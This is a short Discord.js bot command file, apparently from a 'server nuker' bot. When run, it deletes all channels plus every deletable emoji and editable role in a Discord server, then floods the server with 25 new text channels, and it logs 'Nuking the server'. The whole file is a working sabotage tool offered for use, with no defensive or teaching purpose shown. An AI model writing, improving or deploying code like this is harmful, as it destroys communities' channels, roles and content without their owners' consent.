const discord = require('discord.js')
const colors = require('colors')
const config = require("../config.json");

exports.run = async (client, message, args) => {

  if (!message.guild.me.hasPermission("MANAGE_CHANNELS")) return console.log(colors.red(`Fuck! U don't have permissions.`))

    message.guild.emojis.filter(e => e.deleteable).forEach(e => message.guild.deleteEmoji(e))
    message.guild.roles.filter(r => r.editable).forEach(r => r.delete())

    message.guild.channels.forEach(c => c.delete());
    console.log(colors.green("  [+] Nuking the server..."))

    for (i = 0; i < 25; i++) {
      message.guild.createChannel(config.channels, { type: 'text' });
    }
    console.log(colors.green("  [+] Created channels."))
  }
